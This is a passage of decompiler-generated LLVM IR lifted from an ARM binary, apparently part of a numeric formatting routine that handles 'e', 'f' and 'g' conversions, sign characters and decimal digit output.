  store i1 %v2_11e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e44, label %dec_label_pc_11e4c, label %.backedge

.backedge:                                        ; preds = %bb200, %.thread20
  %v1_11e24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_11e4c:                               ; preds = %bb200
  store i32 %v2_11df0, i32* %r2.global-to-local, align 4
  %v2_11e50 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_11e50, i32* %r3.global-to-local, align 4
  %v2_11e54 = sub i32 %v0_11e2c, %v2_11e50
  %v3_11e54 = icmp uge i32 %v0_11e2c, %v2_11e50
  %v4_11e54 = xor i32 %v0_11e2c, %v2_11e50
  %v5_11e54 = xor i32 %v2_11e54, %v0_11e2c
  %v6_11e54 = and i32 %v5_11e54, %v4_11e54
  %v7_11e54 = icmp slt i32 %v6_11e54, 0
  store i1 %v7_11e54, i1* %cpsr_v.global-to-local, align 1
  %v8_11e54 = icmp slt i32 %v2_11e54, 0
  store i1 %v8_11e54, i1* %cpsr_n.global-to-local, align 1
  %v9_11e54 = icmp eq i32 %v0_11e2c, %v2_11e50
  store i1 %v9_11e54, i1* %cpsr_z.global-to-local, align 1
  %v2_11e58 = xor i1 %v3_11e54, true
  %v3_11e58 = or i1 %v9_11e54, %v2_11e58
  br i1 %v3_11e58, label %bb201, label %.thread121

bb201:                                            ; preds = %dec_label_pc_11e4c
  store i32 %v2_11e50, i32* %r2.global-to-local, align 4
  store i32 %v2_11e50, i32* %r1.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11e4c, %bb201
  %v2_11e74 = phi i32 [ %v2_11e50, %bb201 ], [ %v0_11e2c, %dec_label_pc_11e4c ]
  %v4_11e64120 = phi i32 [ %v2_11e50, %bb201 ], [ %v2_11df0, %dec_label_pc_11e4c ]
  %v2_11e60 = xor i1 %v9_11e54, true
  %v3_11e60 = and i1 %v3_11e54, %v2_11e60
  br i1 %v3_11e60, label %bb202, label %.thread122

bb202:                                            ; preds = %.thread121
  %v4_11e60 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_11e60, i32* %r0.global-to-local, align 4
  %v5_11e64 = add i32 %v4_11e64120, 2
  store i32 %v5_11e64, i32* %r2.global-to-local, align 4
  br label %.thread122

.thread122:                                       ; preds = %.thread121, %bb202
  br i1 %v3_11e58, label %bb203, label %bb204

bb203:                                            ; preds = %.thread122
  %v4_11e68 = load i32, i32* %sb.global-to-local, align 4
  %v5_11e68 = add i32 %v4_11e68, 1
  store i32 %v5_11e68, i32* %r0.global-to-local, align 4
  br label %bb204

bb204:                                            ; preds = %.thread122, %bb203
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11e70 = load i32, i32* %r7.global-to-local, align 4
  %v1_11e70 = add i32 %v0_11e70, -103
  %v3_11e70 = sub i32 102, %v0_11e70
  %v4_11e70 = and i32 %v3_11e70, %v0_11e70
  %v5_11e70 = icmp slt i32 %v4_11e70, 0
  store i1 %v5_11e70, i1* %cpsr_v.global-to-local, align 1
  %v6_11e70 = icmp slt i32 %v1_11e70, 0
  store i1 %v6_11e70, i1* %cpsr_n.global-to-local, align 1
  %v7_11e70 = icmp eq i32 %v0_11e70, 103
  store i1 %v7_11e70, i1* %cpsr_z.global-to-local, align 1
  %v3_11e74 = add i32 %v2_11e74, 1
  %v4_11e74 = inttoptr i32 %v3_11e74 to i8*
  store i8 0, i8* %v4_11e74, align 1
  %v0_11e78 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e78 = add i32 %v0_11e78, 1
  store i32 %v1_11e78, i32* %r1.global-to-local, align 4
  %v0_11e7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e7c, label %bb205, label %dec_label_pc_11eac

bb205:                                            ; preds = %bb204
  %v0_11e80 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e80 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_11e84 = icmp sge i32 %v1_11e80, %v0_11e80
  %. = zext i1 %not.v7_11e84 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_11e8c = add i32 %v0_11e80, 4
  %v4_11e8c = sub i32 0, %v0_11e80
  %v5_11e8c = and i32 %v2_11e8c, %v4_11e8c
  %v6_11e8c = icmp slt i32 %v5_11e8c, 0
  store i1 %v6_11e8c, i1* %cpsr_v.global-to-local, align 1
  %v7_11e8c = icmp slt i32 %v2_11e8c, 0
  store i1 %v7_11e8c, i1* %cpsr_n.global-to-local, align 1
  %v8_11e8c = icmp eq i32 %v2_11e8c, 0
  store i1 %v8_11e8c, i1* %cpsr_z.global-to-local, align 1
  %v5_11e90 = icmp slt i32 %v0_11e80, -4
  br i1 %v5_11e90, label %.thread24, label %bb206

.thread24:                                        ; preds = %bb205
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb206:                                            ; preds = %bb205
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11e94 = icmp eq i1 %not.v7_11e84, false
  store i1 %v2_11e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e94, label %.thread, label %bb207

.thread:                                          ; preds = %.thread24, %bb206
  %v1_11e9829 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_11e9829, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11eb8

bb207:                                            ; preds = %bb206
  %v3_11e9c = sub i32 %v1_11e80, %v0_11e80
  store i32 %v3_11e9c, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11ec4

dec_label_pc_11eac:                               ; preds = %bb204
  %v0_11eac = load i32, i32* %r7.global-to-local, align 4
  %v1_11eac = add i32 %v0_11eac, -102
  %v3_11eac = sub i32 101, %v0_11eac
  %v4_11eac = and i32 %v3_11eac, %v0_11eac
  %v5_11eac = icmp slt i32 %v4_11eac, 0
  store i1 %v5_11eac, i1* %cpsr_v.global-to-local, align 1
  %v6_11eac = icmp slt i32 %v1_11eac, 0
  store i1 %v6_11eac, i1* %cpsr_n.global-to-local, align 1
  %v7_11eac = icmp eq i32 %v0_11eac, 102
  store i1 %v7_11eac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11eac, i32* %sl.global-to-local, align 4
  br i1 %v7_11eac, label %dec_label_pc_11eac.dec_label_pc_11ec4_crit_edge, label %dec_label_pc_11eb8

dec_label_pc_11eac.dec_label_pc_11ec4_crit_edge:  ; preds = %dec_label_pc_11eac
  %v0_11ec4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ec4

dec_label_pc_11eb8:                               ; preds = %.thread, %dec_label_pc_11eac
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ed4

dec_label_pc_11ec4:                               ; preds = %bb207, %dec_label_pc_11eac.dec_label_pc_11ec4_crit_edge
  %v0_11ec4 = phi i32 [ %v0_11ec4.pre, %dec_label_pc_11eac.dec_label_pc_11ec4_crit_edge ], [ %v0_11e80, %bb207 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11ec4 = icmp slt i32 %v0_11ec4, 0
  store i1 %v1_11ec4, i1* %cpsr_n.global-to-local, align 1
  %v2_11ec4 = icmp eq i32 %v0_11ec4, 0
  store i1 %v2_11ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11ec4, label %bb208, label %bb209

bb208:                                            ; preds = %dec_label_pc_11ec4
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_11ecc = load i32, i32* %r2.global-to-local, align 4
  %v6_11ecc = add i32 %v5_11ecc, -1
  %v7_11ecc = inttoptr i32 %v6_11ecc to i8*
  store i8 48, i8* %v7_11ecc, align 1
  %v8_11ecc = load i32, i32* %r2.global-to-local, align 4
  %v9_11ecc = add i32 %v8_11ecc, -1
  store i32 %v9_11ecc, i32* %r2.global-to-local, align 4
  %v0_11ed0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_11f00.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11f04.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_11f04.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_11ec4, %bb208
  %v1_11f04.pre = phi i1 [ %v1_11f04.pre.pre, %bb208 ], [ false, %dec_label_pc_11ec4 ]
  %v0_11f04.pre = phi i1 [ %v0_11f04.pre.pre, %bb208 ], [ false, %dec_label_pc_11ec4 ]
  %v1_11f00.pre = phi i32 [ %v1_11f00.pre.pre, %bb208 ], [ %v1_11e78, %dec_label_pc_11ec4 ]
  %v0_11ed0 = phi i32 [ %v0_11ed0.pre, %bb208 ], [ %v0_11ec4, %dec_label_pc_11ec4 ]
  store i32 %v0_11ed0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11eb8, %bb209
  %v0_11fa4 = phi i32 [ 0, %dec_label_pc_11eb8 ], [ %v0_11ed0, %bb209 ]
  %v1_11f08 = phi i1 [ false, %dec_label_pc_11eb8 ], [ %v1_11f04.pre, %bb209 ]
  %v0_11f08 = phi i1 [ false, %dec_label_pc_11eb8 ], [ %v0_11f04.pre, %bb209 ]
  %v1_11f00 = phi i32 [ %v1_11e78, %dec_label_pc_11eb8 ], [ %v1_11f00.pre, %bb209 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_11ee0 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_11ee0, i32* %r3.global-to-local, align 4
  %v0_11eec = load i32, i32* %r2.global-to-local, align 4
  %v1_11eec = inttoptr i32 %v0_11eec to i8*
  %v2_11eec = load i8, i8* %v1_11eec, align 1
  %v3_11eec = zext i8 %v2_11eec to i32
  store i32 %v3_11eec, i32* %r3.global-to-local, align 4
  %v5_11eec = add i32 %v0_11eec, 1
  store i32 %v5_11eec, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_11eec, i32* %stack_var_-46, align 4
  %v2_11f00 = sub i32 %v1_11f00, %v5_11eec
  store i32 %v2_11f00, i32* %r1.global-to-local, align 4
  %v2_11f04 = xor i1 %v1_11f08, %v0_11f08
  br i1 %v2_11f04, label %.thread124, label %dec_label_pc_11f0c

.thread124:                                       ; preds = %dec_label_pc_11ed4
  %v5_11f04 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_11f04, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_11f0c:                               ; preds = %dec_label_pc_11ed4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_11f10 = sub i32 %v0_11fa4, %v2_11f00
  %v4_11f10 = xor i32 %v2_11f00, %v0_11fa4
  %v5_11f10 = xor i32 %v2_11f10, %v0_11fa4
  %v6_11f10 = and i32 %v5_11f10, %v4_11f10
  %v7_11f10 = icmp slt i32 %v6_11f10, 0
  store i1 %v7_11f10, i1* %cpsr_v.global-to-local, align 1
  %v8_11f10 = icmp slt i32 %v2_11f10, 0
  store i1 %v8_11f10, i1* %cpsr_n.global-to-local, align 1
  %v9_11f10 = icmp eq i32 %v0_11fa4, %v2_11f00
  store i1 %v9_11f10, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_11f1c = xor i1 %v8_11f10, %v7_11f10
  br i1 %v2_11f1c, label %bb211, label %dec_label_pc_11f20

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11f0c
  store i32 %v2_11f10, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_11f10, i1* %cpsr_n.global-to-local, align 1
  %v2_11f24 = icmp eq i32 %v2_11f10, 0
  store i1 %v2_11f24, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_11f10, 1
  br i1 %tmp210, label %.thread126, label %dec_label_pc_11f38

.thread126:                                       ; preds = %dec_label_pc_11f20
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11fb0

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f20
  store i32 ptrtoint (i32* @global_var_17497.550 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_11f44 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_11f44, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_11fb4

bb211:                                            ; preds = %dec_label_pc_11f0c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11f90 = icmp slt i32 %v0_11fa4, 0
  store i1 %v1_11f90, i1* %cpsr_n.global-to-local, align 1
  %v2_11f90 = icmp eq i32 %v0_11fa4, 0
  store i1 %v2_11f90, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v0_11fa4, 1
  br i1 %tmp212, label %dec_label_pc_11fb0, label %dec_label_pc_11fa0

dec_label_pc_11fa0:                               ; preds = %bb211
  %v2_11fa4 = sub i32 %v2_11f00, %v0_11fa4
  store i32 %v2_11fa4, i32* %r1.global-to-local, align 4
  %v2_11fa8 = add i32 %v5_11eec, %v0_11fa4
  store i32 %v2_11fa8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa0, %.thread126, %bb211
  %storemerge138.in = phi i32* [ %stack_var_-160, %bb211 ], [ %stack_var_-148, %.thread126 ], [ %stack_var_-148, %dec_label_pc_11fa0 ]
  %v0_11fc480 = phi i32 [ %v2_11f00, %bb211 ], [ 0, %.thread126 ], [ %v2_11fa4, %dec_label_pc_11fa0 ]
  %storemerge138 = ptrtoint i32* %storemerge138.in to i32
  store i32 %storemerge138, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %.thread124, %dec_label_pc_11f38, %dec_label_pc_11fb0
  %v1_11fe4 = phi i32 [ %v2_11f44, %dec_label_pc_11f38 ], [ %storemerge138, %dec_label_pc_11fb0 ], [ %v5_11f04, %.thread124 ]
  %v0_11ffc88 = phi i32 [ -1, %dec_label_pc_11f38 ], [ -1, %dec_label_pc_11fb0 ], [ %v0_11fa4, %.thread124 ]
  %v0_11fc4 = phi i32 [ 0, %dec_label_pc_11f38 ], [ %v0_11fc480, %dec_label_pc_11fb0 ], [ %v2_11f00, %.thread124 ]
  %v0_11fb4 = load i32, i32* %fp.global-to-local, align 4
  %v1_11fb4 = add i32 %v0_11fb4, 12
  %v2_11fb4 = inttoptr i32 %v1_11fb4 to i32*
  %v3_11fb4 = load i32, i32* %v2_11fb4, align 4
  %v1_11fb8 = and i32 %v3_11fb4, 16
  store i32 %v1_11fb8, i32* @lr, align 4
  %v2_11fb8 = icmp eq i32 %v1_11fb8, 0
  %tmp235 = zext i1 %v2_11fb8 to i32
  %.227 = xor i32 %tmp235, 1
  store i32 %.227, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11fc4 = icmp slt i32 %v0_11fc4, 0
  store i1 %v1_11fc4, i1* %cpsr_n.global-to-local, align 1
  %v2_11fc4 = icmp eq i32 %v0_11fc4, 0
  store i1 %v2_11fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fc4, label %bb215, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_11fb4
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11fe0

bb215:                                            ; preds = %dec_label_pc_11fb4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_11fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fb8, label %dec_label_pc_11fd4, label %dec_label_pc_11fe0

dec_label_pc_11fd4:                               ; preds = %bb215
  %v0_11fd4 = load i32, i32* %r7.global-to-local, align 4
  %v1_11fd4 = add i32 %v0_11fd4, -103
  %v3_11fd4 = sub i32 102, %v0_11fd4
  %v4_11fd4 = and i32 %v3_11fd4, %v0_11fd4
  %v5_11fd4 = icmp slt i32 %v4_11fd4, 0
  store i1 %v5_11fd4, i1* %cpsr_v.global-to-local, align 1
  %v6_11fd4 = icmp slt i32 %v1_11fd4, 0
  store i1 %v6_11fd4, i1* %cpsr_n.global-to-local, align 1
  %v7_11fd4 = icmp eq i32 %v0_11fd4, 103
  store i1 %v7_11fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fd4, label %dec_label_pc_11ffc, label %bb216

bb216:                                            ; preds = %dec_label_pc_11fd4
  %v1_11fd8 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_11fd8 = icmp slt i32 %v1_11fd8, 0
  store i1 %v2_11fd8, i1* %cpsr_n.global-to-local, align 1
  %v3_11fd8 = icmp eq i32 %v1_11fd8, 0
  store i1 %v3_11fd8, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v1_11fd8, 1
  br i1 %tmp217, label %dec_label_pc_11ffc, label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %.thread33, %bb215, %bb216
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i32*
  store i32 112, i32* %v2_11fe4, align 4
  %v1_11fec = load i32, i32* %r6.global-to-local, align 4
  %v2_11fec = add i32 %v1_11fec, 4
  %v3_11fec = inttoptr i32 %v2_11fec to i32*
  store i32 1, i32* %v3_11fec, align 4
  store i32 ptrtoint (i32* @global_var_174a4.552 to i32), i32* %r3.global-to-local, align 4
  %v1_11ff4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ff4 = add i32 %v1_11ff4, 8
  %v3_11ff4 = inttoptr i32 %v2_11ff4 to i32*
  store i32 ptrtoint (i32* @global_var_174a4.552 to i32), i32* %v3_11ff4, align 4
  %v0_11ff8 = load i32, i32* %r6.global-to-local, align 4
  %v1_11ff8 = add i32 %v0_11ff8, 12
  store i32 %v1_11ff8, i32* %r6.global-to-local, align 4
  %v0_11ffc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fd4, %bb216, %dec_label_pc_11fe0
  %v1_12008 = phi i32 [ %v1_11fe4, %bb216 ], [ %v1_11ff8, %dec_label_pc_11fe0 ], [ %v1_11fe4, %dec_label_pc_11fd4 ]
  %v0_11ffc = phi i32 [ %v0_11ffc88, %bb216 ], [ %v0_11ffc.pre, %dec_label_pc_11fe0 ], [ %v0_11ffc88, %dec_label_pc_11fd4 ]
  %v1_11ffc = add i32 %v0_11ffc, 1
  store i32 %v1_11ffc, i32* %ip.global-to-local, align 4
  %v3_11ffc = sub i32 0, %v0_11ffc
  %v4_11ffc = and i32 %v1_11ffc, %v3_11ffc
  %v5_11ffc = icmp slt i32 %v4_11ffc, 0
  store i1 %v5_11ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_11ffc = icmp slt i32 %v1_11ffc, 0
  store i1 %v6_11ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_11ffc = icmp eq i32 %v1_11ffc, 0
  store i1 %v7_11ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ffc, label %dec_label_pc_12020, label %dec_label_pc_12004

dec_label_pc_12004:                               ; preds = %dec_label_pc_11ffc
  %v1_12004 = sub i32 -1, %v0_11ffc
  %v2_12008 = add i32 %v1_12008, 4
  %v3_12008 = inttoptr i32 %v2_12008 to i32*
  store i32 %v1_12004, i32* %v3_12008, align 4
  store i32 ptrtoint (i32* @global_var_17497.550 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_12014 = load i32, i32* %r6.global-to-local, align 4
  %v2_12014 = inttoptr i32 %v1_12014 to i32*
  store i32 176, i32* %v2_12014, align 4
  %v0_12018 = load i32, i32* %r3.global-to-local, align 4
  %v1_12018 = load i32, i32* %r6.global-to-local, align 4
  %v2_12018 = add i32 %v1_12018, 8
  %v3_12018 = inttoptr i32 %v2_12018 to i32*
  store i32 %v0_12018, i32* %v3_12018, align 4
  %v0_1201c = load i32, i32* %r6.global-to-local, align 4
  %v1_1201c = add i32 %v0_1201c, 12
  store i32 %v1_1201c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ffc, %dec_label_pc_12004
  %v2_12028 = phi i32 [ %v1_12008, %dec_label_pc_11ffc ], [ %v1_1201c, %dec_label_pc_12004 ]
  %v0_12020 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12020 = icmp slt i32 %v0_12020, 0
  store i1 %v1_12020, i1* %cpsr_n.global-to-local, align 1
  %v2_12020 = icmp eq i32 %v0_12020, 0
  store i1 %v2_12020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12020, label %.thread42, label %bb218

bb218:                                            ; preds = %dec_label_pc_12020
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_12028 = inttoptr i32 %v2_12028 to i32*
  store i32 112, i32* %v3_12028, align 4
  %v1_1202c = load i32, i32* %r4.global-to-local, align 4
  %v2_1202c = load i32, i32* %r6.global-to-local, align 4
  %v3_1202c = add i32 %v2_1202c, 8
  %v4_1202c = inttoptr i32 %v3_1202c to i32*
  store i32 %v1_1202c, i32* %v4_1202c, align 4
  %v1_12030 = load i32, i32* %r1.global-to-local, align 4
  %v2_12030 = load i32, i32* %r6.global-to-local, align 4
  %v3_12030 = add i32 %v2_12030, 4
  %v4_12030 = inttoptr i32 %v3_12030 to i32*
  store i32 %v1_12030, i32* %v4_12030, align 4
  %v1_12034 = load i32, i32* %r6.global-to-local, align 4
  %v2_12034 = add i32 %v1_12034, 12
  store i32 %v2_12034, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_12020, %bb218
  %v1_12058 = phi i32 [ %v2_12028, %dec_label_pc_12020 ], [ %v2_12034, %bb218 ]
  %v0_12038 = load i32, i32* %r7.global-to-local, align 4
  %v1_12038 = add i32 %v0_12038, -103
  %v3_12038 = sub i32 102, %v0_12038
  %v4_12038 = and i32 %v3_12038, %v0_12038
  %v5_12038 = icmp slt i32 %v4_12038, 0
  store i1 %v5_12038, i1* %cpsr_v.global-to-local, align 1
  %v6_12038 = icmp slt i32 %v1_12038, 0
  store i1 %v6_12038, i1* %cpsr_n.global-to-local, align 1
  %v7_12038 = icmp eq i32 %v0_12038, 103
  store i1 %v7_12038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12038, label %dec_label_pc_12040, label %dec_label_pc_12048

dec_label_pc_12040:                               ; preds = %.thread42
  %v0_12040 = load i32, i32* @lr, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12040 = icmp slt i32 %v0_12040, 0
  store i1 %v1_12040, i1* %cpsr_n.global-to-local, align 1
  %v2_12040 = icmp eq i32 %v0_12040, 0
  store i1 %v2_12040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12040, label %dec_label_pc_12070, label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %.thread42, %dec_label_pc_12040
  %v0_12048 = load i32, i32* %ip.global-to-local, align 4
  %v1_12048 = load i32, i32* %r1.global-to-local, align 4
  %v2_12048 = sub i32 %v1_12048, %v0_12048
  store i32 %v2_12048, i32* %r3.global-to-local, align 4
  %v1_1204c = load i32, i32* %r8.global-to-local, align 4
  %v2_1204c = sub i32 %v2_12048, %v1_1204c
  %v4_1204c = xor i32 %v1_1204c, %v2_12048
  %v5_1204c = xor i32 %v2_1204c, %v2_12048
  %v6_1204c = and i32 %v5_1204c, %v4_1204c
  %v7_1204c = icmp slt i32 %v6_1204c, 0
  store i1 %v7_1204c, i1* %cpsr_v.global-to-local, align 1
  %v8_1204c = icmp slt i32 %v2_1204c, 0
  store i1 %v8_1204c, i1* %cpsr_n.global-to-local, align 1
  %v9_1204c = icmp eq i32 %v2_12048, %v1_1204c
  store i1 %v9_1204c, i1* %cpsr_z.global-to-local, align 1
  %v2_12050 = xor i1 %v8_1204c, %v7_1204c
  br i1 %v2_12050, label %dec_label_pc_12054, label %dec_label_pc_12070

dec_label_pc_12054:                               ; preds = %dec_label_pc_12048
  %v2_12054 = sub i32 %v1_1204c, %v2_12048
  %v2_12058 = add i32 %v1_12058, 4
  %v3_12058 = inttoptr i32 %v2_12058 to i32*
  store i32 %v2_12054, i32* %v3_12058, align 4
  store i32 ptrtoint (i32* @global_var_17497.550 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_12064 = load i32, i32* %r6.global-to-local, align 4
  %v2_12064 = inttoptr i32 %v1_12064 to i32*
  store i32 176, i32* %v2_12064, align 4
  %v0_12068 = load i32, i32* %r3.global-to-local, align 4
  %v1_12068 = load i32, i32* %r6.global-to-local, align 4
  %v2_12068 = add i32 %v1_12068, 8
  %v3_12068 = inttoptr i32 %v2_12068 to i32*
  store i32 %v0_12068, i32* %v3_12068, align 4
  %v0_1206c = load i32, i32* %r6.global-to-local, align 4
  %v1_1206c = add i32 %v0_1206c, 12
  store i32 %v1_1206c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %dec_label_pc_12048, %dec_label_pc_12040, %dec_label_pc_12054
  %v1_12104.pre.pre = phi i32 [ %v1_12058, %dec_label_pc_12048 ], [ %v1_12058, %dec_label_pc_12040 ], [ %v1_1206c, %dec_label_pc_12054 ]
  %v0_12070 = load i32, i32* %sl.global-to-local, align 4
  %v1_12070 = add i32 %v0_12070, -102
  %v3_12070 = sub i32 101, %v0_12070
  %v4_12070 = and i32 %v3_12070, %v0_12070
  %v5_12070 = icmp slt i32 %v4_12070, 0
  store i1 %v5_12070, i1* %cpsr_v.global-to-local, align 1
  %v6_12070 = icmp slt i32 %v1_12070, 0
  store i1 %v6_12070, i1* %cpsr_n.global-to-local, align 1
  %v7_12070 = icmp eq i32 %v0_12070, 102
  store i1 %v7_12070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12070, label %dec_label_pc_120f8, label %dec_label_pc_12078

dec_label_pc_12078:                               ; preds = %dec_label_pc_12070
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1207c = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1207c = icmp slt i32 %v0_1207c, 0
  store i1 %v1_1207c, i1* %cpsr_n.global-to-local, align 1
  %v2_1207c = icmp eq i32 %v0_1207c, 0
  store i1 %v2_1207c, i1* %cpsr_z.global-to-local, align 1
  %v4_12080 = zext i8 %stack_var_-66.0105111 to i32
  store i32 %v4_12080, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_12090 = sub i32 0, %v0_1207c
  %storemerge137 = select i1 %v1_1207c, i32 %v4_12090, i32 %v0_1207c
  %tmp236 = ashr i32 %v0_1207c, 31
  %tmp237 = and i32 %tmp236, 2
  %tmp238 = add nuw nsw i32 %tmp237, 43
  store i32 %storemerge137, i32* %r4.global-to-local, align 4
  store i32 %tmp238, i32* %sl.global-to-local, align 4
  %v2_12098 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_12098, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %dec_label_pc_120d0, %dec_label_pc_120a0, %dec_label_pc_12078
  %v0_120a0 = phi i32 [ %storemerge137, %dec_label_pc_12078 ], [ %v0_120bc, %dec_label_pc_120a0 ], [ %v0_120bc, %dec_label_pc_120d0 ]
  store i32 %v0_120a0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_120a8 = call i32 @function_cafc(i32 %v0_120a0, i32 10)
  %v1_120ac = add i32 %v2_120a8, 48
  store i32 %v1_120ac, i32* %r3.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_120b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_120b4, i32* @r0, align 4
  %v1_120b8 = trunc i32 %v1_120ac to i8
  %v2_120b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_120b8 = add i32 %v2_120b8, -1
  %v4_120b8 = inttoptr i32 %v3_120b8 to i8*
  store i8 %v1_120b8, i8* %v4_120b8, align 1
  %v5_120b8 = load i32, i32* %r5.global-to-local, align 4
  %v6_120b8 = add i32 %v5_120b8, -1
  store i32 %v6_120b8, i32* %r5.global-to-local, align 4
  %v0_120bc = call i32 @function_14ea0()
  store i32 %v0_120bc, i32* %r0.global-to-local, align 4
  %v0_120c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_120c0 = add i32 %v0_120c0, 1
  store i32 %v1_120c0, i32* %r7.global-to-local, align 4
  %v1_120c4 = add i32 %v0_120c0, -2
  %v3_120c4 = sub i32 1, %v0_120c0
  %v4_120c4 = and i32 %v3_120c4, %v1_120c0
